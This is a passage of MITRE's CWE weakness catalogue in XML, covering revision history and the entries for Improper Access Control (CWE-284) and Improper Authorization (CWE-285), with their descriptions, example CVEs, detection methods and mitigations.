               <Modification_Comment>updated Maintenance_Notes, Relationships, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Description, Name, Theoretical_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-03-10">Failure to Handle Insufficient Permissions or Privileges</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="284" Name="Improper Access Control" Abstraction="Pillar" Structure="Simple" Status="Incomplete">
         <Description>The product does not restrict or incorrectly restricts access to a resource from an unauthorized actor.</Description>
         <Extended_Description>
            <xhtml:p>Access control involves the use of several protection mechanisms such as:</xhtml:p>
            <xhtml:ul>
               <xhtml:li>Authentication (proving the identity of an actor)</xhtml:li>
               <xhtml:li>Authorization (ensuring that a given actor can access a resource), and</xhtml:li>
               <xhtml:li>Accountability (tracking of activities that were performed)</xhtml:li>
            </xhtml:ul>
            <xhtml:p>When any mechanism is not applied or otherwise fails, attackers can compromise the security of the product by gaining privileges, reading sensitive information, executing commands, evading detection, etc.</xhtml:p>
            <xhtml:p>There are two distinct behaviors that can introduce access control weaknesses:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>Specification: incorrect privileges, permissions, ownership, etc. are explicitly specified for either the user or the resource (for example, setting a password file to be world-writable, or giving administrator capabilities to a guest user). This action could be performed by the program or the administrator.</xhtml:li>
                  <xhtml:li>Enforcement: the mechanism contains errors that prevent it from properly enforcing the specified access control requirements (e.g., allowing the user to specify their own privileges, or allowing a syntactically-incorrect ACL to produce insecure settings). This problem occurs within the program itself, in that it does not actually enforce the intended security policy that the administrator specifies.</xhtml:li>
               </xhtml:ul>
         </Extended_Description>
		 <Applicable_Platforms>
		   <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
		   <Technology Class="ICS/OT" Prevalence="Undetermined"/>
		 </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Authorization</Term>
               <Description>The terms "access control" and "authorization" are often used interchangeably, although many people have distinct definitions. The CWE usage of "access control" is intended as a general term for the various mechanisms that restrict which users can access which resources, and "authorization" is more narrowly defined. It is unlikely that there will be community consensus on the use of these terms.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Varies by Context</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-1">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Description>Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-46">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>
                  <xhtml:p>Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.</xhtml:p>
                  <xhtml:p>Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-29238</Reference>
               <Description>Access-control setting in web-based document collaboration tool is not properly implemented by the code, which prevents listing hidden directories but does not prevent direct requests to files in those directories.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29238</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-23607</Reference>
               <Description>Python-based HTTP library did not scope cookies to a particular domain such that "supercookies" could be sent to any domain on redirect</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-23607</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-21972</Reference>
               <Description>Chain: Cloud computing virtualization platform does not require authentication for upload of a tar format file (CWE-306), then uses .. path traversal sequences (CWE-23) in the file to access unexpected files, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21972</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-37415</Reference>
               <Description>IT management product does not perform authentication for some REST API requests, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-37415</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-13927</Reference>
               <Description>Default setting in workflow management product allows all API requests without authentication, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-13927</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-4624</Reference>
               <Description>Bulletin board applies restrictions on number of images during post creation, but does not enforce this on editing.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-4624</Link>
            </Observed_Example>
         </Observed_Examples>
         <Affected_Resources>
            <Affected_Resource>File or Directory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Access Control List (ACL) errors</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>2</Entry_ID>
               <Entry_Name>Insufficient Authorization</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Missing Access Control</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="19"/>
            <Related_Attack_Pattern CAPEC_ID="441"/>
            <Related_Attack_Pattern CAPEC_ID="478"/>
            <Related_Attack_Pattern CAPEC_ID="479"/>
            <Related_Attack_Pattern CAPEC_ID="502"/>
            <Related_Attack_Pattern CAPEC_ID="503"/>
            <Related_Attack_Pattern CAPEC_ID="536"/>
            <Related_Attack_Pattern CAPEC_ID="546"/>
            <Related_Attack_Pattern CAPEC_ID="550"/>
            <Related_Attack_Pattern CAPEC_ID="551"/>
            <Related_Attack_Pattern CAPEC_ID="552"/>
            <Related_Attack_Pattern CAPEC_ID="556"/>
            <Related_Attack_Pattern CAPEC_ID="558"/>
            <Related_Attack_Pattern CAPEC_ID="562"/>
            <Related_Attack_Pattern CAPEC_ID="563"/>
            <Related_Attack_Pattern CAPEC_ID="564"/>
            <Related_Attack_Pattern CAPEC_ID="578"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 6, &#34;Determining Appropriate Access Control&#34; Page 171"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 17: Failure to Protect Stored Data.&#34; Page 253"/>
            <Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings"/>
         </References>
         <Notes>
            <Note Type="Mapping">
               <xhtml:p>Use for Mapping: Discouraged (this CWE ID should not be used to map to real-world vulnerabilities).</xhtml:p>
               <xhtml:p>Rationale: CWE-284 is extremely high-level, a Pillar. Its name, "Improper Access Control," is often used in low-information vulnerability reports [REF-1287]. It is not useful for trend analysis.</xhtml:p>
               <xhtml:p>Comments: consider using descendants of CWE-284 that are more specific to the kind of access control involved, such as those involving:</xhtml:p>
	       <xhtml:ul>
		 <xhtml:li>authorization (Missing Authorization (CWE-862), Incorrect Authorization (CWE-863), Incorrect Permission Assignment for Critical Resource (CWE-732), etc.)</xhtml:li>
		 <xhtml:li>authentication (Missing Authentication (CWE-306) or Weak Authentication (CWE-1390))</xhtml:li>
		 <xhtml:li>Incorrect User Management (CWE-286)</xhtml:li>
		 <xhtml:li>Improper Restriction of Communication Channel to Intended Endpoints (CWE-923)</xhtml:li>
		 <xhtml:li>etc.</xhtml:li>
	       </xhtml:ul>
            </Note>
            <Note Type="Maintenance">
               <xhtml:p>This entry needs more work. Possible sub-categories include:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>Trusted group includes undesired entities (partially covered by CWE-286)</xhtml:li>
                  <xhtml:li>Group can perform undesired actions</xhtml:li>
                  <xhtml:li>ACL parse error does not fail closed</xhtml:li>
               </xhtml:ul>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Background_Details, Description, Maintenance_Notes, Name, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-24</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>Changed name and description; clarified difference between "access control" and "authorization."</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Background_Details, Description, Maintenance_Notes, Name, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Affected_Resources, Modes_of_Introduction, Observed_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-09-09">Access Control Issues</Previous_Entry_Name>
            <Previous_Entry_Name Date="2011-03-29">Access Control (Authorization) Issues</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="285" Name="Improper Authorization" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action.</Description>
         <Extended_Description>
            <xhtml:p>Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.</xhtml:p>
            <xhtml:p>When access control checks are not applied consistently - or not at all - users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary"/>
			<Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Often"/>
            <Technology Name="Database Server" Prevalence="Often"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: "No access", "Read access", "Change access", and "Full control". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object.</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>AuthZ</Term>
               <Description>"AuthZ" is typically used as an abbreviation of "authorization" within the web application security community. It is distinct from "AuthN" (or, sometimes, "AuthC") which is an abbreviation of "authentication." The use of "Auth" as an abbreviation is discouraged, since it could be used for either authentication or authorization.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>
                  <xhtml:p>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</xhtml:p>
                  <xhtml:p>A developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies.</xhtml:p>
               </Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>
                  <xhtml:p>Authorization weaknesses may arise when a single-user application is ported to a multi-user environment.</xhtml:p>
               </Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>An attacker could read sensitive data, either by reading the data directly from a data store that is not properly restricted, or by accessing insufficiently-protected, privileged functionality to read the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>An attacker could modify sensitive data, either by writing the data directly to a data store that is not properly restricted, or by accessing insufficiently-protected, privileged functionality to write the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker could gain privileges by modifying or reading critical data directly, or by accessing insufficiently-protected, privileged functionality.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-6">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authorization schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an authorization check; an automated technique that detects the absence of authorization may report false positives.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Dynamic Analysis</Method>
               <Description>Automated dynamic analysis may find many or all possible interfaces that do not require authorization, but manual analysis is required to determine if the lack of authorization violates business logic</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.</xhtml:p>
               </Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Host Application Interface Scanner</xhtml:li>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                           <xhtml:li>Forced Path Execution</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Divide the product into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) to enforce the roles at the appropriate boundaries.</xhtml:p>
                  <xhtml:p>Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that you perform access control checks related to your business logic. These checks may be different than the access control checks that you apply to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.</xhtml:p>
                  <xhtml:p>One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Phase>Installation</Phase>
               <Description>Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a "default deny" policy when defining these ACLs.</Description>
            </Mitigation>
         </Potential_Mitigations>
